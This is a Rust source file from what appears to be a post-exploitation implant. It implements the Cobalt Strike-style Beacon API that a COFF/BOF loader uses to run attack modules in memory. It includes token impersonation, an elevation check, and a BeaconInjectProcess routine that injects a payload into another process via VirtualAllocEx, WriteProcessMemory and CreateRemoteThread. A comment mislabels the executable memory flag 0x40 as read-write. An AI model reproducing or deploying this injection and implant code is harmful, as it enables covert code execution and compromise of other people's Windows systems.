#![allow(non_snake_case)]

use alloc::vec::Vec;
use core::{ffi::CStr, ptr};

use alloc::string::String;

use crate::libs::utils::printf;
use crate::{
    get_instance,
    libs::{
        advapi::TokenElevation,
        k32::{ProcessInformation, StartupInfoW, LPTHREAD_START_ROUTINE},
    },
};


use {
    super::loader::CoffeeLdrError,
    core::{
        ffi::c_void,
        mem::size_of,
        ptr::{null, null_mut},
    },
};

type c_char = i8;
type c_int = i32;
type c_short = i16;

#[allow(dead_code)]
const CALLBACK_OUTPUT: u32 = 0x0;
const CALLBACK_OUTPUT_OEM: u32 = 0x1e;
const CALLBACK_ERROR: u32 = 0x0d;
const CALLBACK_OUTPUT_UTF8: u32 = 0x20;

#[repr(C)]
#[derive(Debug, Clone)]
pub struct BeaconOutputBuffer {
    pub buffer: alloc::vec::Vec<c_char>,
}

impl BeaconOutputBuffer {
    pub const fn new() -> Self {
        BeaconOutputBuffer {
            buffer: alloc::vec::Vec::new(),
        }
    }

    fn append_char(&mut self, s: *mut c_char, len: c_int) {
        if s.is_null() || len <= 0 {
            return;
        }
        let tmp = unsafe { core::slice::from_raw_parts(s, len as usize) };
        self.buffer.extend_from_slice(tmp);
    }

    fn append_string(&mut self, s: &str) {
        self.buffer.extend(s.bytes().map(|b| b as c_char));
    }

    fn get_output(&mut self) -> (*mut c_char, usize) {
        let size = self.buffer.len();
        let ptr = self.buffer.as_mut_ptr();
        self.buffer.clear();
        (ptr, size)
    }

    pub fn clear(&mut self) {
        self.buffer.clear();
    }
}

pub fn get_output_data() -> Option<BeaconOutputBuffer> {
    //get_beacon_buffer().lock().map(|buffer| {
    let mut buffer = unsafe{get_instance().unwrap().beacon_buffer.lock()};
    let output = buffer.clone();
    buffer.clear();
    Some(output)
}

fn BeaconGetOutputData(outsize: *mut c_int) -> *mut c_char {
    let mut buffer = unsafe{get_instance().unwrap().beacon_buffer.lock()};
    let (ptr, size) = buffer.get_output();
    unsafe {
        if !outsize.is_null() {
            *outsize = size as c_int;
        }
    }
    ptr
}

fn BeaconOutput(_type: c_int, data: *mut c_char, len: c_int) {
    let mut buffer = unsafe{get_instance().unwrap().beacon_buffer.lock()};
    buffer.append_char(data, len);
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Data {
    original: *mut c_char,
    buffer: *mut c_char,
    length: c_int,
    size: c_int,
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Format {
    original: *mut c_char,
    buffer: *mut c_char,
    length: c_int,
    size: c_int,
}

pub fn get_function_internal_address(name: &str) -> Result<usize, CoffeeLdrError> {
    match name {
        "BeaconPrintf" => Ok(BeaconPrintf as usize),
        "BeaconOutput" => Ok(BeaconOutput as usize),
        "BeaconGetOutputData" => Ok(BeaconGetOutputData as usize),
        "BeaconIsAdmin" => Ok(BeaconIsAdmin as usize),
        "BeaconUseToken" => Ok(BeaconUseToken as usize),
        "BeaconRevertToken" => Ok(BeaconRevertToken as usize),
        "BeaconFormatInt" => Ok(BeaconFormatInt as usize),
        "BeaconFormatFree" => Ok(BeaconFormatFree as usize),
        "BeaconFormatAlloc" => Ok(BeaconFormatAlloc as usize),
        "BeaconFormatReset" => Ok(BeaconFormatReset as usize),
        "BeaconFormatPrintf" => Ok(BeaconFormatPrintf as usize),
        "BeaconFormatAppend" => Ok(BeaconFormatAppend as usize),
        "BeaconFormatToString" => Ok(BeaconFormatToString as usize),
        "BeaconGetSpawnTo" => Ok(BeaconGetSpawnTo as usize),
        "BeaconInjectProcess" => Ok(BeaconInjectProcess as usize),
        "BeaconCleanupProcess" => Ok(BeaconCleanupProcess as usize),
        "BeaconSpawnTemporaryProcess" => Ok(BeaconSpawnTemporaryProcess as usize),
        "BeaconInjectTemporaryProcess" => Ok(BeaconInjectTemporaryProcess as usize),
        "BeaconDataInt" => Ok(BeaconDataInt as usize),
        "BeaconDataShort" => Ok(BeaconDataShort as usize),
        "BeaconDataParse" => Ok(BeaconDataParse as usize),
        "BeaconDataLength" => Ok(BeaconDataLength as usize),
        "BeaconDataExtract" => Ok(BeaconDataExtract as usize),
        "toWideChar" => Ok(toWideChar as usize),
        "__C_specific_handler" => Ok(0),
        _ => Err(CoffeeLdrError::FunctionInternalNotFound(String::from(name))),
    }
}

fn BeaconFormatAlloc(format: *mut Format, max: c_int) {
    if format.is_null() || max == 0 {
        return;
    }

    let original = unsafe {
        alloc::alloc::alloc_zeroed(alloc::alloc::Layout::from_size_align(max as usize, 1).unwrap())
            .cast::<i8>()
    };

    unsafe {
        (*format).original = original;
        (*format).buffer = original;
        (*format).length = 0;
        (*format).size = max;
    }
}

fn BeaconFormatReset(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        core::ptr::write_bytes((*format).original, 0, (*format).size as usize);
        (*format).buffer = (*format).original;
        (*format).length = (*format).size;
    }
}

fn BeaconFormatToString(format: *mut Format, size: *mut c_int) -> *mut c_char {
    if format.is_null() || size.is_null() {
        return null_mut();
    }

    unsafe {
        (*size) = (*format).length;
        (*format).original
    }
}

fn BeaconFormatInt(format: *mut Format, value: c_int) {
    if format.is_null() {
        return;
    }

    unsafe {
        if (*format).length + 4 > (*format).size {
            return;
        }

        let outdata = swap_endianness(value as u32).to_be_bytes();
        core::ptr::copy_nonoverlapping(outdata.as_ptr(), (*format).buffer as *mut u8, 4);

        (*format).buffer = (*format).buffer.add(4);
        (*format).length += 4;
    }
}

fn BeaconFormatAppend(format: *mut Format, text: *const c_char, len: c_int) {
    if format.is_null() || text.is_null() || len <= 0 {
        return;
    }

    unsafe {
        if (*format).length + len > (*format).size {
            return;
        }

        core::ptr::copy_nonoverlapping(text, (*format).buffer, len as usize);
        (*format).buffer = (*format).buffer.add(len as usize);
        (*format).length += len;
    }
}

fn BeaconFormatFree(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        if !(*format).original.is_null() {
            alloc::alloc::dealloc(
                (*format).original as *mut u8,
                alloc::alloc::Layout::from_size_align((*format).size as usize, 1).unwrap(),
            );
            (*format).original = null_mut();
        }

        (*format).buffer = null_mut();
        (*format).length = 0;
        (*format).size = 0;
    }
}

#[no_mangle]
unsafe extern "C" fn BeaconFormatPrintf(format: *mut Format, fmt: *const c_char, mut args: ...) {
    if format.is_null() || fmt.is_null() {
        return;
    }

    let fmt_str = CStr::from_ptr(fmt).to_str().unwrap_or("");

    let temp_str= printf(&CStr::from_ptr(fmt).to_str().unwrap(), args);

    let length_needed = temp_str.len() as c_int;
    if (*format).length + length_needed >= (*format).size {
        return;
    }

    ptr::copy_nonoverlapping(
        temp_str.as_ptr() as *const c_char,
        (*format).buffer.add((*format).length as usize),
        length_needed as usize,
    );

    (*format).length += length_needed;
}

fn BeaconDataShort(data: *mut Data) -> c_short {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 2 {
        return 0;
    }

    let result = unsafe { core::ptr::read_unaligned(parser.buffer as *const i16) };
    parser.buffer = unsafe { parser.buffer.add(2) };
    parser.length -= 2;

    result as c_short
}

fn BeaconDataInt(data: *mut Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return 0;
    }

    let result = unsafe { core::ptr::read_unaligned(parser.buffer as *const i32) };
    parser.buffer = unsafe { parser.buffer.add(4) };
    parser.length -= 4;

    result as c_int
}

fn BeaconDataExtract(data: *mut Data, size: *mut c_int) -> *mut c_char {
    if data.is_null() {
        return null_mut();
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return null_mut();
    }

    let length = unsafe { core::ptr::read_unaligned(parser.buffer as *const u32) };
    let outdata = unsafe { parser.buffer.add(4) };
    if outdata.is_null() {
        return null_mut();
    }

    parser.buffer = unsafe { parser.buffer.add(4 + length as usize) };
    parser.length -= 4 + length as c_int;

    if !size.is_null() && !outdata.is_null() {
        unsafe {
            *size = length as c_int;
        }
    }

    outdata as *mut c_char
}

fn BeaconDataParse(data: *mut Data, buffer: *mut c_char, size: c_int) {
    if data.is_null() {
        return;
    }

    unsafe {
        (*data).original = buffer;
        (*data).buffer = buffer.add(4);
        (*data).length = size - 4;
        (*data).size = size - 4;
    }
}

fn BeaconDataLength(data: *const Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    unsafe { (*data).length }
}

#[no_mangle]
unsafe extern "C" fn BeaconPrintf(_type: c_int, fmt: *mut c_char, mut args: ...) {

    let mut buffer = get_instance().unwrap().beacon_buffer.lock();

    let mut nstr = printf(&CStr::from_ptr(fmt).to_str().unwrap(), args);
    //write_output(nstr.as_bytes());

    nstr.push('\0');
    buffer.append_string(&nstr);
}

fn BeaconRevertToken() {
    unsafe {
        (get_instance().unwrap().advapi.revert_to_self)();
    }
}

fn BeaconUseToken(token: *mut c_void) -> i32 {
    let token_resp =
        unsafe { (get_instance().unwrap().advapi.set_thread_token)(null_mut(), token) };
    token_resp as i32
}

fn BeaconCleanupProcess(info: *const ProcessInformation) {
    unsafe {
        (get_instance().unwrap().k32.close_handle)((*info).h_process);
        (get_instance().unwrap().k32.close_handle)((*info).h_thread);
    }
}

fn BeaconIsAdmin() -> u32 {
    let mut h_token = null_mut();

    unsafe {
        if (get_instance().unwrap().advapi.open_process_token)(
            (get_instance().unwrap().k32.get_current_process)(),
            8,
            &mut h_token,
        ) {
            let mut elevation = TokenElevation {
                token_is_elevated: 0,
            };
            let mut return_length = 0;

            if (get_instance().unwrap().advapi.get_token_information)(
                h_token,
                0x14,
                &mut elevation as *mut _ as *mut c_void,
                size_of::<TokenElevation>() as u32,
                &mut return_length,
            ) {
                return (elevation.token_is_elevated == 1) as u32;
            }
        }
    }

    0
}

fn swap_endianness(src: u32) -> u32 {
    if cfg!(target_endian = "little") {
        src.swap_bytes()
    } else {
        src
    }
}

fn toWideChar(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
    if src.is_null() || dst.is_null() || max < size_of::<u16>() as c_int {
        return 0;
    }

    unsafe {
        // Converting the `src` pointer to a C string (`CStr`)
        let c_str = CStr::from_ptr(src);

        // Converts CStr to a Rust string (&str)
        if let Ok(str_slice) = c_str.to_str() {
            // Encoding a Rust string as UTF-16
            let utf16_chars: Vec<u16> = str_slice.encode_utf16().collect();
            let dst_slice =
                alloc::slice::from_raw_parts_mut(dst, (max as usize) / size_of::<u16>());

            let num_chars = utf16_chars.len();
            if num_chars >= dst_slice.len() {
                return 0; // Not enough space
            }

            // Copy the UTF-16 characters to the destination buffer
            dst_slice[..num_chars].copy_from_slice(&utf16_chars);

            // Adds the null-terminator
            dst_slice[num_chars] = 0;
        }
    }
    1
}

fn BeaconInjectProcess(
    _h_process: *mut c_void,
    pid: c_int,
    payload: *const c_char,
    len: c_int,
    _offset: c_char,
    _arg: *const c_char,
    _a_len: c_int,
) {
    if payload.is_null() || len <= 0 {
        return;
    }

    unsafe {
        let h_process = (get_instance().unwrap().k32.open_process)(
            0x0008 | // PROCESS_VM_OPERATION
            0x0020, // PROCESS_VM_WRITE,
            false,
            pid as u32,
        );
        if h_process.is_null() {
            return;
        }

        let address = (get_instance().unwrap().k32.virtual_alloc_ex)(
            h_process,
            null_mut(),
            len as usize,
            0x1000 | 0x2000, //MEM_COMMIT | MEM_RESERVE
            0x40,            //PAGE_READWRITE
        );
        if address.is_null() {
            (get_instance().unwrap().k32.close_handle)(h_process);
            return;
        }

        let mut number_of_write = 0;
        if !(get_instance().unwrap().k32.write_process_memory)(
            h_process,
            address,
            payload as *const c_void,
            len as usize,
            &mut number_of_write,
        ) {
            (get_instance().unwrap().k32.close_handle)(h_process);
            return;
        }

        let h_thread = (get_instance().unwrap().k32.create_remote_thread)(
            h_process,
            null(),
            0,
            core::mem::transmute::<*mut c_void, LPTHREAD_START_ROUTINE>(address),
            null_mut(),
            0,
            null_mut(),
        );
        if h_thread.is_null() {
            (get_instance().unwrap().k32.close_handle)(h_process);
            return;
        }

        (get_instance().unwrap().k32.close_handle)(h_thread);
        (get_instance().unwrap().k32.close_handle)(h_process);
    }
}

fn BeaconInjectTemporaryProcess(
    _info: *const ProcessInformation,
    _payload: *const c_char,
    _len: c_int,
    _offset: c_int,
    _arg: *const c_char,
    _a_len: c_int,
) {
    unimplemented!()
}

fn BeaconSpawnTemporaryProcess(
    _x86: i32,
    _ignore_token: i32,
    _s_info: *mut StartupInfoW,
    _p_info: *mut ProcessInformation,
) {
    unimplemented!()
}

fn BeaconGetSpawnTo(_x86: i32, _buffer: *const c_char, _length: c_int) {
    unimplemented!()
}
